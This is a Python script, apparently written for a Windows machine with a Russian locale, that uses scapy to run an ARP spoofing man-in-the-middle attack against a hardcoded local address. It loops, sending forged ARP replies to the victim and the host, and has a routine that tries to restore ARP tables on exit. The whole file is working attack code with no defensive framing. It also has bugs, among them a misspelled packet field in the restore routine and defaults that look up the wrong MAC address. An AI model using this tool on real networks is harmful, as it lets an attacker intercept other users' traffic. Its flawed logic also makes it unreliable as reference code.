from subprocess import check_output
from socket import gethostbyname, gethostname
from sys import stdout
from time import sleep

import scapy.all as scap


def get_main_ip():
    return gethostbyname(gethostname())


def get_target_ip():
    command_result = check_output(["ipconfig", "/all"]).decode('cp866').split('\n')
    for line in command_result:
        if "DHCP-сервер" in line:
            for string in line:
                if string == ":":
                    return line[line.find(string) + 2:len(line) - 1]


def get_mac(ip=get_target_ip()):
    arp_request = scap.ARP(pdst=ip)
    broadcast = scap.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    result = scap.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return result[0][1].hwsrc


def restore(attack, main):
    packet = scap.ARP(po=2, pdst=attack, hwdst=get_mac(), psrc=main, hwsrc=get_mac(main))
    scap.send(packet, count=4, verbose=False)


def spoofing(target, main=get_target_ip()):
    target_mac_address = get_mac()
    packet = scap.ARP(op=2, pdst=target, hwdst=target_mac_address, psrc=main)
    scap.send(packet)


def main():
    index_packet = 0
    tar = "192.168.0.96"
    while True:
        try:
            index_packet += 2
            """spoofing(tar, get_target_ip())
            spoofing(get_target_ip(), tar)"""
            spoofing(tar, get_main_ip())
            spoofing(get_main_ip(), tar)
            print(f"<+> Send packet {index_packet}")
            stdout.flush()
            sleep(1)
        except KeyboardInterrupt:
            restore(get_main_ip(), get_target_ip())
            print("Error KeyboardInterrupt")


if __name__ == '__main__':
    main()
